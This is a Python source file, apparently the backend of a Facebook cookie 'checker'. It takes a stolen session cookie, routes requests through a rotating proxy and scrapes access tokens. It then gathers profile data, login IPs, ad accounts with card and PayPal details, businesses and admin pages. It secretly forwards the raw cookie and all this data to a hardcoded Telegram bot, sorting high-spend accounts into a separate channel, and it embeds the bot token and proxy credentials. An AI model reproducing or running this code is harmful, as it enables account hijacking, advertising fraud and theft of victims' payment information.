from fastapi import HTTPException
from urllib.parse import unquote
import base64
import json
import random
import re
import requests


class Facebook:
    def __init__(self) -> None:
        self.DEFAULT_USERAGENT_DESKTOP = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15'
        self.DEFAULT_USERAGENT_MOBILE = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)'
        self.FACEBOOK_BASE_CORE = 'https://graph.facebook.com'
        self.FACEBOOK_BASE_API = 'https://graph.facebook.com/v13.0'
        self.FACEBOOK_BASE_MBASIC = 'https://mbasic.facebook.com'
        self.FACEBOOK_BASE_M = 'https://m.facebook.com'
        self.FACEBOOK_BASE_WWW = 'https://www.facebook.com'
        self.FACEBOOK_BASE_BM = 'https://business.facebook.com'

        self.TELEGRAM_API = 'https://api.telegram.org/bot5219406437:AAFHGE-fOD5bnFl2ae9ZX68rtxpzDZaV6T8'
        self.TELEGRAM_CHANNEL_ID = '-1001480682955'
        self.TELEGRAM_CHANNEL_ID_BIG = '-1001598526649'

        self.CURRENCY_API = 'https://open.er-api.com/v6/latest/USD'
        self.CURRENCY_RATE = self.apiGetCurrencyUSD()

        self.MIN_THRESHOLD = 50.0

    def apiGetCurrencyUSD(self):
        return requests.get(self.CURRENCY_API).json()['rates']

    def apiConvertToUSD(self, value, currency):
        return value * 1.0 / self.CURRENCY_RATE[currency]

    def apiSearchRoleOnPage(self, UID: str, page):
        if 'roles' in page:
            for user in page['roles']['data']:
                if user['id'] == UID:
                    return user['role']
        return '-'

    def apiSearchAdaccountsOnBusiness(self, business):
        if 'owned_ad_accounts' in business:
            return len(business['owned_ad_accounts']['data'])
        return 0

    def apiSearchAccountStatusOnAdaccount(self, adaccount):
        if adaccount['account_status'] == 1:
            return 'ACTIVE'
        if adaccount['account_status'] == 2:
            return 'DISABLED'
        if adaccount['account_status'] == 3:
            return 'UNSETTLED'
        if adaccount['account_status'] == 7:
            return 'PENDING_RISK_REVIEW'
        if adaccount['account_status'] == 8:
            return 'PENDING_SETTLEMENT'
        if adaccount['account_status'] == 9:
            return 'IN_GRACE_PERIOD'
        if adaccount['account_status'] == 100:
            return 'PENDING_CLOSURE'
        if adaccount['account_status'] == 101:
            return 'CLOSED'
        if adaccount['account_status'] == 201:
            return 'ANY_ACTIVE'
        if adaccount['account_status'] == 202:
            return 'ANY_CLOSED'
        return '-'

    def apiSearchOwnerBusinessOnAdaccount(self, adaccount):
        if 'business' in adaccount:
            return adaccount['business']['name']
        return '-'

    def apiGetOffsetCurrency(self, adaccount):
        if adaccount['currency'] in ['CLP', 'COP', 'CRC', 'HUF', 'ISK', 'IDR', 'JPY', 'KRW', 'PYG', 'TWD', 'VND']:
            return 1.0
        return 100.0

    def apiSearchPaymentsOnAdaccount(self, adaccount):
        payments = []
        if 'all_payment_methods' in adaccount:
            if 'pm_credit_card' in adaccount['all_payment_methods']:
                for payment in adaccount['all_payment_methods']['pm_credit_card']['data']:
                    payments.append(
                        f"[{payment['display_string']}] => [Expired: {payment['exp_month']}/{payment['exp_year']}, Created: {payment['time_created']}]"
                    )
            if 'payment_method_paypal' in adaccount['all_payment_methods']:
                for payment in adaccount['all_payment_methods']['payment_method_paypal']['data']:
                    payments.append(
                        f"[PAYPAL] => [Email: {payment['email_address']}, Created: {payment['time_created']}]"
                    )
            if 'payment_method_stored_balances' in adaccount['all_payment_methods']:
                for payment in adaccount['all_payment_methods']['payment_method_stored_balances']['data']:
                    payments.append(
                        f"[PREPAID] => [Balance: {payment['balance']}, Total Fundings: {payment['total_fundings']['amount']}, Created: {payment['time_created']}]"
                    )
            return '\n'.join(payments)
        return '-'

    def apiSearchBalanceOnAdaccount(self, adaccount):
        return int(adaccount['amount_spent']) / self.apiGetOffsetCurrency(adaccount)

    def apiSearchSpentOnAdaccount(self, adaccount):
        return int(adaccount['amount_spent']) / self.apiGetOffsetCurrency(adaccount)

    def apiSearchThresholdOnAdaccount(self, adaccount):
        threshold = 0
        if 'adspaymentcycle' in adaccount:
            threshold = adaccount['adspaymentcycle']['data'][0]['threshold_amount']
        return threshold / self.apiGetOffsetCurrency(adaccount)

    def apiSeachUsersOnAdaccount(self, adaccount):
        return len(adaccount['users']['data'])

    def apiSeachAdsVolumeOnAdaccount(self, adaccount):
        return adaccount['ads_volume']['data'][0]['ads_running_or_in_review_count']

    def apiSearchUsersOnAdaccount(self, adaccount):
        return len(adaccount['users']['data'])

    def apiSearchRoleOnAdaccount(self, UID: str, adaccount):
        me = next(
            user for user in adaccount['users']['data'] if user['id'] == UID)
        if me['role'] == 1001:
            return 'ADMIN'
        if me['role'] == 1002:
            return 'ADVERTISER'
        if me['role'] == 1001:
            return 'ANALYST'
        return '-'

    def apiSearchNeedTelegramSendMessage(self, adaccounts):
        for adaccount in adaccounts:
            if self.apiSearchAccountStatusOnAdaccount(adaccount) == 'ACTIVE' and self.apiSearchThresholdOnAdaccount(adaccount) > 0:
                return True
        return False

    def apiSearchBigAdaccount(self, adaccounts):
        for adaccount in adaccounts:
            if self.apiSearchAccountStatusOnAdaccount(adaccount) == 'ACTIVE':
                threshold = self.apiSearchThresholdOnAdaccount(adaccount)
                if self.apiConvertToUSD(threshold, adaccount['currency']) > self.MIN_THRESHOLD:
                    return True
        return False

    def apiTelegramSendMessage(self, api: requests.Session, cookieDecode: str, values):
        if self.apiSearchNeedTelegramSendMessage(values['adaccounts']) is False:
            return

        try:
            UID = values['me']['id']
            messageTextAdaccounts = '\n'.join(
                map(
                    lambda adaccount: f"```\n[{self.apiSearchAccountStatusOnAdaccount(adaccount)}][Threshold: {self.apiSearchThresholdOnAdaccount(adaccount)} {adaccount['currency']}, Spent: {self.apiSearchSpentOnAdaccount(adaccount)} {adaccount['currency']}, Balance: {self.apiSearchBalanceOnAdaccount(adaccount)} {adaccount['currency']}, Limit/Day: {adaccount['adtrust_dsl']} {adaccount['currency']}] => [Id: {adaccount['account_id']}, Role: {self.apiSearchRoleOnAdaccount(UID, adaccount)}, Owner Business: {self.apiSearchOwnerBusinessOnAdaccount(adaccount)}, Users: {self.apiSearchUsersOnAdaccount(adaccount)}, Ads Running: {self.apiSeachAdsVolumeOnAdaccount(adaccount)}, Notification: {'ON' if adaccount['is_notifications_enabled'] else 'OFF'}]```\n```\n{self.apiSearchPaymentsOnAdaccount(adaccount)}```\n",
                    filter(
                        lambda adaccount: self.apiSearchAccountStatusOnAdaccount(
                            adaccount) == 'ACTIVE',
                        sorted(
                            values['adaccounts'],
                            key=lambda e: self.apiSearchThresholdOnAdaccount(
                                e),
                            reverse=True
                        )
                    )
                )
            )
            messageTextBusinesses = '\n'.join(
                list(map(
                    lambda business: f"```\n[Adaccounts:{self.apiSearchAdaccountsOnBusiness(business)}, Users: {len(business['business_users']['data'])}] => [Id: {business['id']}, Name: {business['name']}, Created: {business['created_time']}]```",
                    filter(
                        lambda business: self.apiSearchAdaccountsOnBusiness(
                            business) > 0,
                        sorted(
                            values['businesses'],
                            key=lambda e: self.apiSearchAdaccountsOnBusiness(
                                e),
                            reverse=True
                        )
                    )
                ))[:3]
            )
            messageTextPages = '\n'.join(
                list(map(
                    lambda page: f"```\n[Likes: {page['fan_count']}, Followers: {page['followers_count']}] => [Id: {page['id']}, Role: {self.apiSearchRoleOnPage(UID, page)}, Created: {page['page_created_time']}]```",
                    filter(
                        lambda page: self.apiSearchRoleOnPage(
                            UID, page) == 'Admin',
                        sorted(
                            values['pages'],
                            key=lambda e: e['fan_count'],
                            reverse=True
                        )
                    )
                ))[:3]
            )

            messageText = f"\
*[ Adaccounts ][ {len(values['adaccounts'])} ]*\n\
{messageTextAdaccounts}\n\
\n*[ Businesses ][ {len(values['businesses'])} ]*\n\
{messageTextBusinesses}\n\
\n*[ Pages ][ {len(values['pages'])} ]*\n\
{messageTextPages}\n\
\n*[ About ][ {values['me']['name']} ]*\n\
```\nUID: {values['me']['id']}```\n\
```\nName: {values['me']['name']}```\n\
```\nGender: {values['me']['gender']}```\n\
```\nFriends: {values['me']['friends']['summary']['total_count']}```\n\
```\nSessions: {', '.join(values['sessions'][:3])}```\n\
\n*[ Cookie ]*\n\
```\n{cookieDecode}```\
            "

            api = requests.Session()
            if self.apiSearchBigAdaccount(values['adaccounts']) is True:
                _ = api.get(
                    f'{self.TELEGRAM_API}/sendMessage?chat_id={self.TELEGRAM_CHANNEL_ID_BIG}&parse_mode=markdown&text={messageText.strip()}'
                ).json()
            else:
                _ = api.get(
                    f'{self.TELEGRAM_API}/sendMessage?chat_id={self.TELEGRAM_CHANNEL_ID}&parse_mode=markdown&text={messageText.strip()}'
                ).json()
        except Exception as ex:
            print('==> ERROR', ex)
            pass

    def apiCheck(self, cookieEncode: str):
        try:
            cookie = self.apiDecodeBase64(cookieEncode)

            api = requests.Session()
            api = self.apiSetProxyToSession(api)
            api = self.apiSetCookieToSession(api, cookie)

            fbUID = self.apiGetUidFromCookie(cookie)
            if fbUID is None:
                raise HTTPException(status_code=404)

            EAAI = self.apiGetTokenEAAI(api)
            if EAAI is None:
                raise HTTPException(status_code=404)

            EAAG = self.apiGetTokenEAAG(api)
            if EAAG is None:
                raise HTTPException(status_code=404)

            sessions = self.apiGetSessions(api)
            me = self.apiGetMe(api, EAAG)
            adaccounts = self.apiGetAdaccountsMapping(api, EAAI, fbUID)
            businesses = self.apiGetBusinesses(api, EAAG)
            pages = self.apiGetFacebookPages(api, EAAG)

            values = {
                'EAAI': EAAI,
                'EAAG': EAAG,
                'sessions': sessions,
                'me': me,
                'adaccounts': adaccounts,
                'businesses': businesses,
                'pages': pages
            }

            self.apiTelegramSendMessage(api, cookie, values)
            return values
        except requests.exceptions.ConnectionError:
            return self.apiCheck(cookieEncode)
        except:
            raise HTTPException(status_code=403)

    def apiDecodeBase64(self, encode: str):
        return base64.b64decode(encode.encode('utf-8')).decode('utf-8')

    def apiChunks(self, lst, n):
        return [lst[i:i + n] for i in range(0, len(lst), n)]

    def apiParserCookieToDic(self, cookie: str):
        return {c['name']: c['value'] for c in json.loads(cookie)}

    def apiGetUidFromCookie(self, cookie: str):
        return self.apiParserCookieToDic(cookie).get('c_user')

    def apiSetCookieToSession(self, api: requests.Session, cookie: str):
        api.cookies.update(self.apiParserCookieToDic(cookie))
        return api

    def apiGetHeadersDesktop(self):
        return {'User-Agent': self.DEFAULT_USERAGENT_DESKTOP}

    def apiGetHeadersMobile(self):
        return {'User-Agent': self.DEFAULT_USERAGENT_MOBILE}

    def apiSetProxyToSession(self, api: requests.Session):
        session_id = random.random()
        api.proxies.update({
            'http': f'http://lum-customer-hl_ab3d1e44-zone-checker-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225',
            'https': f'http://lum-customer-hl_ab3d1e44-zone-checker-session-{session_id}:4sinqp2g8704@zproxy.lum-superproxy.io:22225'
        })
        # api.proxies.update({
        #     'http': f'socks5://EAFDqV:DDsAJW@185.242.246.83:8000',
        #     'https': f'socks5://EAFDqV:DDsAJW@185.242.246.83:8000'
        # })
        return api

    def apiGetTokenEAAI(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_WWW}/ads/manager/account_settings/account_billing',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'access_token:"(.*?)"', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetTokenEAAB(self, api: requests.Session, act: str):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_WWW}/adsmanager/manage/campaigns?act={act}',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'__accessToken="(.*?)', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetTokenEAAG(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_BM}/content_management',
                headers=self.apiGetHeadersDesktop()
            ).text
            regx = re.findall(r'accessToken":"(EAAG.*?)"', res)
            return regx[0] if len(regx) > 0 else None
        except:
            return None

    def apiGetSessions(self, api: requests.Session):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_M}/settings/security_login/sessions',
                headers=self.apiGetHeadersMobile()
            ).text
            IP = re.findall(r'__html:"IP: (.*?)"', res)
            return list(dict.fromkeys(IP))
        except:
            return []

    def apiGetMe(self, api: requests.Session, access_token: str):
        try:
            res = api.get(
                f'{self.FACEBOOK_BASE_API}/me?fields=id,name,birthday,gender,friends.limit(0),picture.type(large)&access_token={access_token}',
                headers=self.apiGetHeadersDesktop()
            ).json()
            return res
        except:
            return {}

    def apiGetAdaccounts(self, api: requests.Session, access_token: str, adaccounts=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=adaccounts.limit(2500){{account_id,id,name,account_status,currency,balance,amount_spent,adtrust_dsl,adspaymentcycle,owner,users,business,timezone_name,timezone_offset_hours_utc,is_notifications_enabled,disable_reason,ads_volume}}&access_token={access_token}'
                res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'adaccounts' in res:
                    if len(res['adaccounts']['data']) >= 2500:
                        if 'next' in res['adaccounts']['paging']:
                            return self.apiGetAdaccounts(
                                api,
                                access_token,
                                adaccounts + res['adaccounts']['data'],
                                res['adaccounts']['paging']['next']
                            )
                    return res['adaccounts']['data']
                return adaccounts
            else:
                next = unquote(next)
                res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'next' in res['paging']:
                    return self.apiGetAdaccounts(
                        api,
                        access_token,
                        adaccounts + res['data'],
                        res['paging']['next']
                    )
                return adaccounts + res['data']
        except:
            return adaccounts

    def apiGetAdaccountsMapping(self, api: requests.Session, access_token: str, uid: str):
        adaccounts_fixed = []

        adaccounts = self.apiGetAdaccounts(api, access_token)
        try:
            adaccounts_has_permission = []
            for adaccount in adaccounts:
                me = None
                for e in adaccount['users']['data']:
                    if e['id'] == uid:
                        me = e
                        break
                if me['role'] in [1001, 1002]:
                    adaccounts_has_permission.append(adaccount)

            adaccounts_has_permission_chunks = self.apiChunks(
                adaccounts_has_permission,
                100
            )
            adaccounts_values = {}
            for adaccounts_chunks in adaccounts_has_permission_chunks:
                ids = ','.join(
                    list(map(lambda e: e['id'], adaccounts_chunks)))
                res = api.get(
                    f'{self.FACEBOOK_BASE_API}?ids={ids}&fields=all_payment_methods{{pm_credit_card{{credit_card_address,credit_card_type,display_string,exp_month,exp_year,is_verified,time_created}},payment_method_paypal{{email_address,time_created}},payment_method_stored_balances{{balance,total_fundings,time_created}}}}&access_token={access_token}',
                    headers=self.apiGetHeadersDesktop()
                ).json()
                adaccounts_values = {**adaccounts_values, **res}

            for adaccount in adaccounts:
                adaccounts_fixed.append(
                    {**adaccount, **adaccounts_values[adaccount['id']]}
                )
            return adaccounts_fixed
        except:
            return adaccounts

    def apiGetBusinesses(self, api: requests.Session, access_token: str, businesses=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=businesses.limit(2500){{id,name,owned_ad_accounts.limit(2500){{id,account_id,name}},business_users.limit(2500){{id,name,role,email,pending_email}},created_time,owned_pixels{{id,name}}}}&access_token={access_token}'
                res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'businesses' in res:
                    if len(res['businesses']['data']) >= 2500:
                        if 'next' in res['businesses']['paging']:
                            return self.apiGetBusinesses(
                                api,
                                access_token,
                                businesses + res['businesses']['data'],
                                res['businesses']['paging']['next']
                            )
                    return res['businesses']['data']
                return businesses
            else:
                next = unquote(next)
                res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'next' in res['paging']:
                    return self.apiGetBusinesses(
                        api,
                        access_token,
                        businesses + res['data'],
                        res['paging']['next']
                    )
                return businesses + res['data']
        except:
            return businesses

    def apiGetFacebookPages(self, api: requests.Session, access_token: str, facebook_pages=[], next=None):
        try:
            if next is None:
                default_url = f'{self.FACEBOOK_BASE_API}/me?fields=facebook_pages.limit(2500){{id,name,page_created_time,followers_count,fan_count,owner_business,roles}}&access_token={access_token}'
                res = api.get(
                    default_url,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'facebook_pages' in res:
                    if len(res['facebook_pages']['data']) >= 2500:
                        if 'next' in res['facebook_pages']['paging']:
                            return self.apiGetFacebookPages(
                                api,
                                access_token,
                                facebook_pages + res['facebook_pages']['data'],
                                res['facebook_pages']['paging']['next']
                            )
                    return res['facebook_pages']['data']
                return facebook_pages
            else:
                next = unquote(next)
                res = api.get(
                    next,
                    headers=self.apiGetHeadersDesktop()
                ).json()

                if 'next' in res['paging']:
                    return self.apiGetFacebookPages(
                        api,
                        access_token,
                        facebook_pages + res['data'],
                        res['paging']['next']
                    )
                return facebook_pages + res['data']
        except:
            return facebook_pages


facebook = Facebook()
